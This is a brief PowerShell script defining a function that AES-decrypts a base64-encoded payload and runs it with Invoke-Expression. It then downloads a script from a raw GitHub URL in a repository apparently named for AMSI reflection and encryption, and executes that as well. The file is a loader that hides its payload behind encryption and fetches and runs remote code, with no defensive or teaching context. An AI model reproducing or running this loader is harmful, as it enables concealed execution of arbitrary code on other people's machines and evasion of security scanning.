Function hehe {
    Param (
        [String]$Data,
        [Parameter(Mandatory=$false)]
        [String]$Key,
        [Parameter(Mandatory=$false)]
        [String]$IVector
    )

    $AES = [System.Security.Cryptography.Aes]::Create()

    $AES.Key = [System.Convert]::FromBase64String($Key)
    $AES.IV = [System.Convert]::FromBase64String($IVector)
    $EncryptedBytes = [System.Convert]::FromBase64String($Data)
    $Decryptor = $AES.CreateDecryptor()
    $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)
    $DecryptedString = [System.Text.Encoding]::Unicode.GetString($DecryptedBytes)

    Invoke-Expression -Command $DecryptedString
    $scriptContent = Invoke-WebRequest -Uri https://raw.githubusercontent.com/M0M3NTUM44/AMSIReflectionCrypt/main/TestScript.ps1 -UseBasicParsing
		Invoke-Expression -Command $scriptContent
}
